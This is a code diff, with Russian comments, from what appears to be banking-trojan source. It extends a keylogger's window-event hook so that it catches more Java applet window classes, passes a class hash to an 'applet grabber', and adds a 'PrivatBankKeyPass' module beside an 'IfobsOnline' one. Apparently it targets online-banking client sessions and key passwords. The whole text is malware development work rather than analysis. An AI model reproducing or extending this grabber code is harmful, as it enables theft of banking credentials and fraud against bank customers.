@@ -10,7 +10,7 @@
 //---------------------------------------------------------------------------
 
 
-void ActivateJavaAppletGrabber(HWND JafaFrameWnd, const char* URL, bool IsChildWindow);
+void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWindow);
 
 
 //--------------------------------------------------------
@@ -43,17 +43,33 @@ void WINAPI JavaAppletShowWndEvent(PKeyLogger Logger, DWORD EventID,
 		return;
     }
 
-	// Проверяем отображаемое окно
-	DWORD Hash = GetWndClassHash(SW->Window, true);
-	if (Hash != 0x809BB5B9 /* sunawtframe */) return;
+    if (JavaAppletWnd == SW->Window) return;
 
-	if (JavaAppletWnd != SW->Window)
+	// Массив окон на которые мы должны отреагировать
+	const static DWORD KnownWindows[] = {JAVAWND_SUNAWTFRAME,
+										 JAVAWND_SUNAWTDIALOG,
+										 0};
+
+	// Проверяем отображаемое окно
+	bool IsKnownWindow = false;
+	DWORD Hash = GetWndClassHash(SW->Window, true);
+
+	for (int i = 0; KnownWindows[i] != 0; i++)
+		if (KnownWindows[i] == Hash)
+		{
+			IsKnownWindow = true;
+			break;
+		}
+
+	// Поймали нужное окно
+	if (IsKnownWindow)
 	{
 		PCHAR URL = GetURLFromJavaProcess();
+
 		JavaAppletWnd = SW->Window;
 		bool IsChildWindow = pGetParent(SW->Window) != NULL;
 
-		ActivateJavaAppletGrabber(JavaAppletWnd, URL, IsChildWindow);
+		ActivateJavaAppletGrabber(JavaAppletWnd, Hash, URL, IsChildWindow);
 	}
 }
 
@@ -146,11 +162,16 @@ HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd)
 
 
 //============================================================================
-void ActivateJavaAppletGrabber(HWND JafaFrameWnd, const char* URL, bool IsChildWindow)
+void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWindow)
 {
 	// Инициализируем IfobsOnline
 	#ifdef IfobsOnlineH
-		IfobsOnline::Initialize(JafaFrameWnd, URL, IsChildWindow);
+		IfobsOnline::Initialize(JafaFrameWnd, ClassWndHash, URL, IsChildWindow);
+	#endif
+
+
+	#ifdef PrivatBankKeyPassH
+		PrivatBankKeyPass::Initialize(JafaFrameWnd, ClassWndHash);
 	#endif
 
 }
